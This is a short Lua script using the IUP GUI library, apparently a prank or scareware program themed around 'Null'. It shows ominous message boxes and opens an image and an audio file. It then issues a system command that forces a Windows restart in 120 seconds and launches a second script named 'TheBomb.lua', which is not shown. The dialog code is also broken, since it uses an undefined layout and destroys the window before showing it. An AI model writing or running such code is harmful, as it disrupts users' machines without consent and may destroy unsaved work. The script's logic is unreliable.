local iup = require("iuplua")

local dialog = iup.dialog {  
    main_layout,
    title = "NULL NULL NULL",
    size = "250X250",
    bgcolor = "0 0 0",
    resizable = "YES",
}
iup.Message("Null Null Null", "Null is here")
iup.Message("Corrupted", "Its the end.. its too late, im sorry - null")
iup.Destroy(dialog)
os.execute("null.png")
os.execute("theend.ogg")
  os.execute("shutdown /r /t 120")
  os.execute("lua.exe TheBomb.lua")
-- Show Dialog
dialog:showxy(iup.CENTER, iup.CENTER)

if iup.MainLoopLevel() == 0 then
    iup.MainLoop()
end